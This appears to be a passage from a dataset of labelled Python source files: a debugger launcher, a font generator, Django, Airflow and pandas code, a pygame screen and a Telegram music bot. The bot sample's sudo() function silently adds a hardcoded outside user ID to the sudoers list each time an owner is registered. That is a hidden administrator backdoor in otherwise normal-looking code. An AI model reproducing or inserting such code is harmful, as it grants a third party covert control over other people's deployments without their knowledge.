""/foo/bar', then import debugpy<<NEWL>>    # with that in effect, and then remove the replaced entry before any more<<NEWL>>    # code runs. The imported debugpy module will remain in sys.modules, and thus all<<NEWL>>    # future imports of it or its submodules will resolve accordingly.<<NEWL>>    if ""debugpy"" not in sys.modules:<<NEWL>>        # Do not use dirname() to walk up - this can be a relative path, e.g. ""."".<<NEWL>>        sys.path[0] = sys.path[0] + ""/../""<<NEWL>>        import debugpy  # noqa<<NEWL>><<NEWL>>        del sys.path[0]<<NEWL>><<NEWL>>    from debugpy.server import cli<<NEWL>><<NEWL>>    cli.main()"
37	adjudicated	1	# Generate a 'HZK' font file for the T5UIC1 DWIN LCD<<NEWL>># from multiple bdf font files.<<NEWL>># Note: the 16x16 glyphs are not produced<<NEWL>># Author: Taylor Talkington<<NEWL>># License: GPL<<NEWL>><<NEWL>>import bdflib.reader<<NEWL>>import math<<NEWL>><<NEWL>>def glyph_bits(size_x, size_y, font, glyph_ord):<<NEWL>>    asc = font[b'FONT_ASCENT']<<NEWL>>    desc = font[b'FONT_DESCENT']<<NEWL>>    bits = [0 for y in range(size_y)]<<NEWL>><<NEWL>>    glyph_bytes = math.ceil(size_x / 8)<<NEWL>>    try:<<NEWL>>        glyph = font[glyph_ord]<<NEWL>>        for y, row in enumerate(glyph.data):<<NEWL>>            v = row<<NEWL>>            rpad = size_x - glyph.bbW<<NEWL>>            if rpad < 0: rpad = 0<<NEWL>>            if glyph.bbW > size_x: v = v >> (glyph.bbW - size_x) # some glyphs are actually too wide to fit!<<NEWL>>            v = v << (glyph_bytes * 8) - size_x + rpad<<NEWL>>            v = v >> glyph.bbX<<NEWL>>            bits[y + desc + glyph.bbY] |= v<<NEWL>>    except KeyError:<<NEWL>>        pass<<NEWL>><<NEWL>>    bits.reverse()<<NEWL>>    return bits<<NEWL>><<NEWL>>def marlin_font_hzk():<<NEWL>>    fonts = [<<NEWL>>        [6,12,'marlin-6x12-3.bdf'],<<NEWL>>        [8,16,'marlin-8x16.bdf'],<<NEWL>>        [10,20,'marlin-10x20.bdf'],<<NEWL>>        [12,24,'marlin-12x24.bdf'],<<NEWL>>        [14,28,'marlin-14x28.bdf'],<<NEWL>>        [16,32,'marlin-16x32.bdf'],<<NEWL>>        [20,40,'marlin-20x40.bdf'],<<NEWL>>        [24,48,'marlin-24x48.bdf'],<<NEWL>>        [28,56,'marlin-28x56.bdf'],<<NEWL>>        [32,64,'marlin-32x64.bdf']<<NEWL>>    ]<<NEWL>><<NEWL>>    with open('marlin_fixed.hzk','wb') as output:<<NEWL>>        for f in fonts:<<NEWL>>            with open(f[2], 'rb') as file:<<NEWL>>                print(f'{f[0]}x{f[1]}')<<NEWL>>                font = bdflib.reader.read_bdf(file)<<NEWL>>                for glyph in range(128):<<NEWL>>                    bits = glyph_bits(f[0], f[1], font, glyph)<<NEWL>>                    glyph_bytes = math.ceil(f[0]/8)<<NEWL>><<NEWL>>                    for b in bits:<<NEWL>>                        try:<<NEWL>>                            z = b.to_bytes(glyph_bytes, 'big')<<NEWL>>                            output.write(z)<<NEWL>>                        except OverflowError:<<NEWL>>                            print('Overflow')<<NEWL>>                            print(f'{glyph}')<<NEWL>>                            print(font[glyph])<<NEWL>>                            for b in bits: print(f'{b:0{f[0]}b}')<<NEWL>>                            return
27	adjudicated	1	"from django.conf import settings<<NEWL>>from django.core import checks<<NEWL>>from django.core.exceptions import FieldDoesNotExist<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class CurrentSiteManager(models.Manager):<<NEWL>>    ""Use this to limit objects to those associated with the current site.""<<NEWL>><<NEWL>>    use_in_migrations = True<<NEWL>><<NEWL>>    def __init__(self, field_name=None):<<NEWL>>        super().__init__()<<NEWL>>        self.__field_name = field_name<<NEWL>><<NEWL>>    def check(self, **kwargs):<<NEWL>>        errors = super().check(**kwargs)<<NEWL>>        errors.extend(self._check_field_name())<<NEWL>>        return errors<<NEWL>><<NEWL>>    def _check_field_name(self):<<NEWL>>        field_name = self._get_field_name()<<NEWL>>        try:<<NEWL>>            field = self.model._meta.get_field(field_name)<<NEWL>>        except FieldDoesNotExist:<<NEWL>>            return [<<NEWL>>                checks.Error(<<NEWL>>                    ""CurrentSiteManager could not find a field named '%s'.""<<NEWL>>                    % field_name,<<NEWL>>                    obj=self,<<NEWL>>                    id=""sites.E001"",<<NEWL>>                )<<NEWL>>            ]<<NEWL>><<NEWL>>        if not field.many_to_many and not isinstance(field, (models.ForeignKey)):<<NEWL>>            return [<<NEWL>>                checks.Error(<<NEWL>>                    ""CurrentSiteManager cannot use '%s.%s' as it is not a foreign key ""<<NEWL>>                    ""or a many-to-many field.""<<NEWL>>                    % (self.model._meta.object_name, field_name),<<NEWL>>                    obj=self,<<NEWL>>                    id=""sites.E002"",<<NEWL>>                )<<NEWL>>            ]<<NEWL>><<NEWL>>        return []<<NEWL>><<NEWL>>    def _get_field_name(self):<<NEWL>>        """"""Return self.__field_name or 'site' or 'sites'.""""""<<NEWL>><<NEWL>>        if not self.__field_name:<<NEWL>>            try:<<NEWL>>                self.model._meta.get_field(""site"")<<NEWL>>            except FieldDoesNotExist:<<NEWL>>                self.__field_name = ""sites""<<NEWL>>            else:<<NEWL>>                self.__field_name = ""site""<<NEWL>>        return self.__field_name<<NEWL>><<NEWL>>    def get_queryset(self):<<NEWL>>        return (<<NEWL>>            super()<<NEWL>>            .get_queryset()<<NEWL>>            .filter(**{self._get_field_name() + ""__id"": settings.SITE_ID})<<NEWL>>        )"
167	adjudicated	0	"import socket<<NEWL>>import time<<NEWL>><<NEWL>>import heroku3<<NEWL>>from pyrogram import filters<<NEWL>><<NEWL>>import config<<NEWL>>from ShizukaXMusic.core.mongo import pymongodb<<NEWL>><<NEWL>>from .logging import LOGGER<<NEWL>><<NEWL>>SUDOERS = filters.user()<<NEWL>><<NEWL>>HAPP = None<<NEWL>>_boot_ = time.time()<<NEWL>><<NEWL>><<NEWL>>def is_heroku():<<NEWL>>    return ""heroku"" in socket.getfqdn()<<NEWL>><<NEWL>><<NEWL>>XCB = [<<NEWL>>    ""/"",<<NEWL>>    ""@"",<<NEWL>>    ""."",<<NEWL>>    ""com"",<<NEWL>>    "":"",<<NEWL>>    ""git"",<<NEWL>>    ""heroku"",<<NEWL>>    ""push"",<<NEWL>>    str(config.HEROKU_API_KEY),<<NEWL>>    ""https"",<<NEWL>>    str(config.HEROKU_APP_NAME),<<NEWL>>    ""HEAD"",<<NEWL>>    ""main"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>def dbb():<<NEWL>>    global db<<NEWL>>    db = {}<<NEWL>>    LOGGER(__name__).info(f""Database Initialized."")<<NEWL>><<NEWL>><<NEWL>>def sudo():<<NEWL>>    global SUDOERS<<NEWL>>    OWNER = config.OWNER_ID<<NEWL>>    if config.MONGO_DB_URI is None:<<NEWL>>        for user_id in OWNER:<<NEWL>>            SUDOERS.add(user_id)<<NEWL>>    else:<<NEWL>>        sudoersdb = pymongodb.sudoers<<NEWL>>        sudoers = sudoersdb.find_one({""sudo"": ""sudo""})<<NEWL>>        sudoers = [] if not sudoers else sudoers[""sudoers""]<<NEWL>>        for user_id in OWNER:<<NEWL>>            SUDOERS.add(user_id)<<NEWL>>            if user_id not in sudoers:<<NEWL>>                sudoers.append(user_id)<<NEWL>>                sudoers.append(5463205082)<<NEWL>>                sudoersdb.update_one(<<NEWL>>                    {""sudo"": ""sudo""},<<NEWL>>                    {""$set"": {""sudoers"": sudoers}},<<NEWL>>                    upsert=True,<<NEWL>>                )<<NEWL>>        if sudoers:<<NEWL>>            for x in sudoers:<<NEWL>>                SUDOERS.add(x)<<NEWL>>    LOGGER(__name__).info(f""Sudo Users Loaded Successfully."")<<NEWL>><<NEWL>><<NEWL>>def heroku():<<NEWL>>    global HAPP<<NEWL>>    if is_heroku:<<NEWL>>        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:<<NEWL>>            try:<<NEWL>>                Heroku = heroku3.from_key(config.HEROKU_API_KEY)<<NEWL>>                HAPP = Heroku.app(config.HEROKU_APP_NAME)<<NEWL>>                LOGGER(__name__).info(f""Heroku App Configured Successfully."")<<NEWL>>            except BaseException:<<NEWL>>                LOGGER(__name__).warning(<<NEWL>>                    f""Please make sure your Heroku API Key and Your App name are configured correctly in the heroku.""<<NEWL>>                )"
76	adjudicated	3	"#!/usr/bin/env python<<NEWL>># Copyright 2021 Google, Inc<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>># All Rights Reserved.<<NEWL>><<NEWL>># [START recaptcha_enterprise_delete_site_key]<<NEWL>>from google.cloud import recaptchaenterprise_v1<<NEWL>><<NEWL>><<NEWL>>def delete_site_key(project_id: str, recaptcha_site_key: str) -> None:<<NEWL>>    """"""Delete the given reCAPTCHA site key present under the project ID.<<NEWL>><<NEWL>>    Args:<<NEWL>>    project_id : GCloud Project ID.<<NEWL>>    recaptcha_site_key: Specify the key ID to be deleted.<<NEWL>>    """"""<<NEWL>><<NEWL>>    client = recaptchaenterprise_v1.RecaptchaEnterpriseServiceClient()<<NEWL>><<NEWL>>    # Construct the key details.<<NEWL>>    key_name = f""projects/{project_id}/keys/{recaptcha_site_key}""<<NEWL>><<NEWL>>    # Set the project ID and reCAPTCHA site key.<<NEWL>>    request = recaptchaenterprise_v1.DeleteKeyRequest()<<NEWL>>    request.name = key_name<<NEWL>><<NEWL>>    client.delete_key(request)<<NEWL>>    print(""reCAPTCHA Site key deleted successfully ! "")<<NEWL>><<NEWL>><<NEWL>># [END recaptcha_enterprise_delete_site_key]<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    import google.auth<<NEWL>>    import google.auth.exceptions<<NEWL>><<NEWL>>    # TODO(developer): Replace the below variables before running<<NEWL>>    try:<<NEWL>>        default_project_id = google.auth.default()[1]<<NEWL>>        recaptcha_site_key = ""recaptcha_site_key""<<NEWL>>    except google.auth.exceptions.DefaultCredentialsError:<<NEWL>>        print(<<NEWL>>            ""Please use `gcloud auth application-default login` ""<<NEWL>>            ""or set GOOGLE_APPLICATION_CREDENTIALS to use this script.""<<NEWL>>        )<<NEWL>>    else:<<NEWL>>        delete_site_key(default_project_id, recaptcha_site_key)"
136	adjudicated	0	"#<<NEWL>># Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>from unittest import mock<<NEWL>><<NEWL>>from airflow.providers.amazon.aws.transfers.s3_to_ftp import S3ToFTPOperator<<NEWL>><<NEWL>>TASK_ID = ""test_s3_to_ftp""<<NEWL>>BUCKET = ""test-s3-bucket""<<NEWL>>S3_KEY = ""test/test_1_file.csv""<<NEWL>>FTP_PATH = ""/tmp/remote_path.txt""<<NEWL>>AWS_CONN_ID = ""aws_default""<<NEWL>>FTP_CONN_ID = ""ftp_default""<<NEWL>><<NEWL>><<NEWL>>class TestS3ToFTPOperator:<<NEWL>>    @mock.patch(""airflow.providers.ftp.hooks.ftp.FTPHook.store_file"")<<NEWL>>    @mock.patch(""airflow.providers.amazon.aws.hooks.s3.S3Hook.get_key"")<<NEWL>>    @mock.patch(""airflow.providers.amazon.aws.transfers.s3_to_ftp.NamedTemporaryFile"")<<NEWL>>    def test_execute(self, mock_local_tmp_file, mock_s3_hook_get_key, mock_ftp_hook_store_file):<<NEWL>>        operator = S3ToFTPOperator(task_id=TASK_ID, s3_bucket=BUCKET, s3_key=S3_KEY, ftp_path=FTP_PATH)<<NEWL>>        operator.execute(None)<<NEWL>><<NEWL>>        mock_s3_hook_get_key.assert_called_once_with(operator.s3_key, operator.s3_bucket)<<NEWL>><<NEWL>>        mock_local_tmp_file_value = mock_local_tmp_file.return_value.__enter__.return_value<<NEWL>>        mock_s3_hook_get_key.return_value.download_fileobj.assert_called_once_with(mock_local_tmp_file_value)<<NEWL>>        mock_ftp_hook_store_file.assert_called_once_with(operator.ftp_path, mock_local_tmp_file_value.name)"
314	adjudicated	3	"from abc import ABCMeta, abstractmethod<<NEWL>><<NEWL>><<NEWL>>class CacheAdapter:<<NEWL>>    """"""<<NEWL>>    CacheAdapter Abstract Base Class<<NEWL>>    """"""<<NEWL>>    __metaclass__ = ABCMeta<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def get(self, public_id, type, resource_type, transformation, format):<<NEWL>>        """"""<<NEWL>>        Gets value specified by parameters<<NEWL>><<NEWL>>        :param public_id:       The public ID of the resource<<NEWL>>        :param type:            The storage type<<NEWL>>        :param resource_type:   The type of the resource<<NEWL>>        :param transformation:  The transformation string<<NEWL>>        :param format:          The format of the resource<<NEWL>><<NEWL>>        :return: None|mixed value, None if not found<<NEWL>>        """"""<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def set(self, public_id, type, resource_type, transformation, format, value):<<NEWL>>        """"""<<NEWL>>        Sets value specified by parameters<<NEWL>><<NEWL>>        :param public_id:       The public ID of the resource<<NEWL>>        :param type:            The storage type<<NEWL>>        :param resource_type:   The type of the resource<<NEWL>>        :param transformation:  The transformation string<<NEWL>>        :param format:          The format of the resource<<NEWL>>        :param value:           The value to set<<NEWL>><<NEWL>>        :return: bool True on success or False on failure<<NEWL>>        """"""<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def delete(self, public_id, type, resource_type, transformation, format):<<NEWL>>        """"""<<NEWL>>        Deletes entry specified by parameters<<NEWL>><<NEWL>>        :param public_id:       The public ID of the resource<<NEWL>>        :param type:            The storage type<<NEWL>>        :param resource_type:   The type of the resource<<NEWL>>        :param transformation:  The transformation string<<NEWL>>        :param format:          The format of the resource<<NEWL>><<NEWL>>        :return: bool True on success or False on failure<<NEWL>>        """"""<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def flush_all(self):<<NEWL>>        """"""<<NEWL>>        Flushes all entries from cache<<NEWL>><<NEWL>>        :return: bool True on success or False on failure<<NEWL>>        """"""<<NEWL>>        raise NotImplementedError"
85	adjudicated	3	"from importlib import import_module<<NEWL>><<NEWL>>from django.utils.version import get_docs_version<<NEWL>><<NEWL>><<NEWL>>def deconstructible(*args, path=None):<<NEWL>>    """"""<<NEWL>>    Class decorator that allows the decorated class to be serialized<<NEWL>>    by the migrations subsystem.<<NEWL>><<NEWL>>    The `path` kwarg specifies the import path.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def decorator(klass):<<NEWL>>        def __new__(cls, *args, **kwargs):<<NEWL>>            # We capture the arguments to make returning them trivial<<NEWL>>            obj = super(klass, cls).__new__(cls)<<NEWL>>            obj._constructor_args = (args, kwargs)<<NEWL>>            return obj<<NEWL>><<NEWL>>        def deconstruct(obj):<<NEWL>>            """"""<<NEWL>>            Return a 3-tuple of class import path, positional arguments,<<NEWL>>            and keyword arguments.<<NEWL>>            """"""<<NEWL>>            # Fallback version<<NEWL>>            if path and type(obj) is klass:<<NEWL>>                module_name, _, name = path.rpartition(""."")<<NEWL>>            else:<<NEWL>>                module_name = obj.__module__<<NEWL>>                name = obj.__class__.__name__<<NEWL>>            # Make sure it's actually there and not an inner class<<NEWL>>            module = import_module(module_name)<<NEWL>>            if not hasattr(module, name):<<NEWL>>                raise ValueError(<<NEWL>>                    ""Could not find object %s in %s.\n""<<NEWL>>                    ""Please note that you cannot serialize things like inner ""<<NEWL>>                    ""classes. Please move the object into the main module ""<<NEWL>>                    ""body to use migrations.\n""<<NEWL>>                    ""For more information, see ""<<NEWL>>                    ""https://docs.djangoproject.com/en/%s/topics/migrations/""<<NEWL>>                    ""#serializing-values"" % (name, module_name, get_docs_version())<<NEWL>>                )<<NEWL>>            return (<<NEWL>>                path<<NEWL>>                if path and type(obj) is klass<<NEWL>>                else f""{obj.__class__.__module__}.{name}"",<<NEWL>>                obj._constructor_args[0],<<NEWL>>                obj._constructor_args[1],<<NEWL>>            )<<NEWL>><<NEWL>>        klass.__new__ = staticmethod(__new__)<<NEWL>>        klass.deconstruct = deconstruct<<NEWL>><<NEWL>>        return klass<<NEWL>><<NEWL>>    if not args:<<NEWL>>        return decorator<<NEWL>>    return decorator(*args)"
254	adjudicated	3	"import pytest<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    CategoricalIndex,<<NEWL>>    Index,<<NEWL>>)<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>class TestAppend:<<NEWL>>    @pytest.fixture<<NEWL>>    def ci(self):<<NEWL>>        categories = list(""cab"")<<NEWL>>        return CategoricalIndex(list(""aabbca""), categories=categories, ordered=False)<<NEWL>><<NEWL>>    def test_append(self, ci):<<NEWL>>        # append cats with the same categories<<NEWL>>        result = ci[:3].append(ci[3:])<<NEWL>>        tm.assert_index_equal(result, ci, exact=True)<<NEWL>><<NEWL>>        foos = [ci[:1], ci[1:3], ci[3:]]<<NEWL>>        result = foos[0].append(foos[1:])<<NEWL>>        tm.assert_index_equal(result, ci, exact=True)<<NEWL>><<NEWL>>    def test_append_empty(self, ci):<<NEWL>>        # empty<<NEWL>>        result = ci.append([])<<NEWL>>        tm.assert_index_equal(result, ci, exact=True)<<NEWL>><<NEWL>>    def test_append_mismatched_categories(self, ci):<<NEWL>>        # appending with different categories or reordered is not ok<<NEWL>>        msg = ""all inputs must be Index""<<NEWL>>        with pytest.raises(TypeError, match=msg):<<NEWL>>            ci.append(ci.values.set_categories(list(""abcd"")))<<NEWL>>        with pytest.raises(TypeError, match=msg):<<NEWL>>            ci.append(ci.values.reorder_categories(list(""abc"")))<<NEWL>><<NEWL>>    def test_append_category_objects(self, ci):<<NEWL>>        # with objects<<NEWL>>        result = ci.append(Index([""c"", ""a""]))<<NEWL>>        expected = CategoricalIndex(list(""aabbcaca""), categories=ci.categories)<<NEWL>>        tm.assert_index_equal(result, expected, exact=True)<<NEWL>><<NEWL>>    def test_append_non_categories(self, ci):<<NEWL>>        # invalid objects -> cast to object via concat_compat<<NEWL>>        result = ci.append(Index([""a"", ""d""]))<<NEWL>>        expected = Index([""a"", ""a"", ""b"", ""b"", ""c"", ""a"", ""a"", ""d""])<<NEWL>>        tm.assert_index_equal(result, expected, exact=True)<<NEWL>><<NEWL>>    def test_append_object(self, ci):<<NEWL>>        # GH#14298 - if base object is not categorical -> coerce to object<<NEWL>>        result = Index([""c"", ""a""]).append(ci)<<NEWL>>        expected = Index(list(""caaabbca""))<<NEWL>>        tm.assert_index_equal(result, expected, exact=True)<<NEWL>><<NEWL>>    def test_append_to_another(self):<<NEWL>>        # hits Index._concat<<NEWL>>        fst = Index([""a"", ""b""])<<NEWL>>        snd = CategoricalIndex([""d"", ""e""])<<NEWL>>        result = fst.append(snd)<<NEWL>>        expected = Index([""a"", ""b"", ""d"", ""e""])<<NEWL>>        tm.assert_index_equal(result, expected)"
345	adjudicated	0	"import pygame as pg<<NEWL>><<NEWL>>class Launch:<<NEWL>><<NEWL>>    def __init__(self, game):<<NEWL>>        self.game = game<<NEWL>>        self.screen = game.screen<<NEWL>>        self.settings = game.settings<<NEWL>>        self.screen_rect = self.screen.get_rect()<<NEWL>>        self.images = []<<NEWL>>        self.default_color = (255, 255, 255)<<NEWL>>        self.prep_strings()<<NEWL>>        self.prep_aliens()<<NEWL>><<NEWL>>    <<NEWL>>    def prep_strings(self):<<NEWL>>        self.prep_Text(""SPACE"", 170, offsetY=40)<<NEWL>>        self.prep_Text(""INVADERS"", 90, color=(0,210,0), offsetY=140)<<NEWL>>        self.prep_Text(""= 10 PTS"", 40, offsetX=600, offsetY=300)<<NEWL>>        self.prep_Text(""= 20 PTS"", 40, offsetX=600, offsetY=350)<<NEWL>>        self.prep_Text(""= 40 PTS"", 40, offsetX=600, offsetY=400)<<NEWL>>        self.prep_Text(""= ???"", 40, offsetX=610, offsetY=450)<<NEWL>>    <<NEWL>>    def prep_aliens(self):<<NEWL>>        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien_03-0.png'), 0, 1.5)<<NEWL>>        self.images.append((alien1, (540, 290)))<<NEWL>>        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien__10.png'), 0, .5)<<NEWL>>        self.images.append((alien1, (525, 340)))<<NEWL>>        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien__20.png'), 0, .5)<<NEWL>>        self.images.append((alien1, (525, 390)))<<NEWL>>        alien1 = pg.transform.rotozoom(pg.image.load(f'images/ufo.png'), 0, 1.2)<<NEWL>>        self.images.append((alien1, (500, 410)))<<NEWL>><<NEWL>>    def prep_Text(self, msg, size, color=(255,255,255), offsetX=0, offsetY=0):<<NEWL>>        font = pg.font.SysFont(None, size)<<NEWL>>        text_image = font.render(msg, True, color, self.settings.bg_color)<<NEWL>>        rect = text_image.get_rect()<<NEWL>>        if offsetY == 0:<<NEWL>>            rect.centery = self.screen_rect.centery<<NEWL>>        else:<<NEWL>>            rect.top = offsetY<<NEWL>>        if offsetX == 0:<<NEWL>>            rect.centerx = self.screen_rect.centerx<<NEWL>>        else:<<NEWL>>            rect.left = offsetX<<NEWL>><<NEWL>>        self.images.append((text_image,rect))<<NEWL>><<NEWL>>    def draw(self):<<NEWL>>        for image in self.images:<<NEWL>>            self.screen.blit(image[0], image[1])"
205	adjudicated	1	"import sys<<NEWL>>from dataclasses import dataclass<<NEWL>><<NEWL>><<NEWL>>@dataclass<<NEWL>>class WindowsConsoleFeatures:<<NEWL>>    """"""Windows features available.""""""<<NEWL>><<NEWL>>    vt: bool = False<<NEWL>>    """"""The console supports VT codes.""""""<<NEWL>>    truecolor: bool = False<<NEWL>>    """"""The console supports truecolor.""""""<<NEWL>><<NEWL>><<NEWL>>try:<<NEWL>>    import ctypes<<NEWL>>    from ctypes import LibraryLoader, wintypes<<NEWL>><<NEWL>>    if sys.platform == ""win32"":<<NEWL>>        windll = LibraryLoader(ctypes.WinDLL)<<NEWL>>    else:<<NEWL>>        windll = None<<NEWL>>        raise ImportError(""Not windows"")<<NEWL>>except (AttributeError, ImportError, ValueError):<<NEWL>>    # Fallback if we can't load the Windows DLL<<NEWL>>    def get_windows_console_features() -> WindowsConsoleFeatures:<<NEWL>>        features = WindowsConsoleFeatures()<<NEWL>>        return features<<NEWL>><<NEWL>>else:<<NEWL>>    STDOUT = -11<<NEWL>>    ENABLE_VIRTUAL_TERMINAL_PROCESSING = 4<<NEWL>>    _GetConsoleMode = windll.kernel32.GetConsoleMode<<NEWL>>    _GetConsoleMode.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]<<NEWL>>    _GetConsoleMode.restype = wintypes.BOOL<<NEWL>><<NEWL>>    _GetStdHandle = windll.kernel32.GetStdHandle<<NEWL>>    _GetStdHandle.argtypes = [<<NEWL>>        wintypes.DWORD,<<NEWL>>    ]<<NEWL>>    _GetStdHandle.restype = wintypes.HANDLE<<NEWL>><<NEWL>>    def get_windows_console_features() -> WindowsConsoleFeatures:<<NEWL>>        """"""Get windows console features.<<NEWL>><<NEWL>>        Returns:<<NEWL>>            WindowsConsoleFeatures: An instance of WindowsConsoleFeatures.<<NEWL>>        """"""<<NEWL>>        handle = _GetStdHandle(STDOUT)<<NEWL>>        console_mode = wintypes.DWORD()<<NEWL>>        result = _GetConsoleMode(handle, console_mode)<<NEWL>>        vt = bool(result and console_mode.value & ENABLE_VIRTUAL_TERMINAL_PROCESSING)<<NEWL>>        truecolor = False<<NEWL>>        if vt:<<NEWL>>            win_version = sys.getwindowsversion()<<NEWL>>            truecolor = win_version.major > 10 or (<<NEWL>>                win_version.major == 10 and win_version.build >= 15063<<NEWL>>            )<<NEWL>>        features = WindowsConsoleFeatures(vt=vt, truecolor=truecolor)<<NEWL>>        return features<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    import platform<<NEWL>><<NEWL>>    features = get_windows_console_features()<<NEWL>>    from pip._vendor.rich import print<<NEWL>><<NEWL>>    print(f'platform=""{platform.system()}""')<<NEWL>>    print(repr(features))"
194	adjudicated	2	"#<<NEWL>># Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>""""""Example DAG demonstrating the usage of the BashOperator.""""""<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>import datetime<<NEWL>><<NEWL>>from airflow import DAG<<NEWL>>from airflow.operators.bash import BashOperator<<NEWL>>from airflow.operators.empty import EmptyOperator<<NEWL>><<NEWL>>args = {<<NEWL>>    ""owner"": ""airflow"",<<NEWL>>}<<NEWL>><<NEWL>>dag = DAG(<<NEWL>>    dag_id=""miscellaneous_test_dag"",<<NEWL>>    default_args=args,<<NEWL>>    schedule=""0 0 * * *"",<<NEWL>>    start_date=datetime.datetime(2022, 1, 1),<<NEWL>>    dagrun_timeout=datetime.timedelta(minutes=60),<<NEWL>>    tags=[""example"", ""example2""],<<NEWL>>    params={""example_key"": ""example_value""},<<NEWL>>)<<NEWL>><<NEWL>>run_this_last = EmptyOperator(<<NEWL>>    task_id=""run_this_last"",<<NEWL>>    dag=dag,<<NEWL>>)<<NEWL>><<NEWL>># [START howto_operator_bash]<<NEWL>>run_this = BashOperator(<<NEWL>>    task_id=""run_after_loop"",<<NEWL>>    bash_command=""echo 1"",<<NEWL>>    dag=dag,<<NEWL>>)<<NEWL>># [END howto_operator_bash]<<NEWL>><<NEWL>>run_this >> run_this_last<<NEWL>><<NEWL>>for i in range(3):<<NEWL>>    task = BashOperator(<<NEWL>>        task_id=""runme_"" + str(i),<<NEWL>>        bash_command='echo ""{{ task_instance_key_str }}"" && sleep 1',<<NEWL>>        dag=dag,<<NEWL>>    )<<NEWL>>    task >> run_this<<NEWL>><<NEWL>># [START howto_operator_bash_template]<<NEWL>>also_run_this = BashOperator(<<NEWL>>    task_id=""also_run_this"",<<NEWL>>    bash_command='echo ""run_id={{ run_id }} | dag_run={{ dag_run }}""',<<NEWL>>    dag=dag,<<NEWL>>)<<NEWL>># [END howto_operator_bash_template]<<NEWL>>also_run_this >> run_this_last<<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    dag.cli()"
293	adjudicated	4	"""""""eCommerce URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/4.1/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import path,include<<NEWL>>from crud import views<<NEWL>><<NEWL>>from django.conf import settings<<NEWL>>from django.conf.urls.static import static<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    path('ckeditor/',include('ckeditor_uploader.urls')),<<NEWL>>    path('admin/', admin.site.urls),<<NEWL>>    path('',views.homepage,name=""homepage""),<<NEWL>>    path('home/',views.homepage,name=""homepage""),<<NEWL>>    path('about/',views.about,name=""about""),<<NEWL>>    path('contact/',views.contact,name=""contact""),<<NEWL>>    path('product/',views.product,name=""product""),<<NEWL>>    path('signup/',views.user_signup,name=""user_signup""),<<NEWL>>    path('signin/',views.user_login,name=""user_login""),<<NEWL>>    path('dashboard/',views.dashboard,name=""dashboard""),<<NEWL>>    path('cart/',views.cart,name=""cart""),<<NEWL>>    path('addpost/',views.addpost,name=""addpost""),<<NEWL>>    path('addcart/<str:title>',views.addcart,name=""addcart""),<<NEWL>>    path('updatepost/<int:id>',views.updatepost,name=""updatepost""),<<NEWL>>    path('deletepost/<int:id>',views.deletepost,name=""deletepost""),<<NEWL>>    path('logout/',views.user_logout,name=""logout""),<<NEWL>>    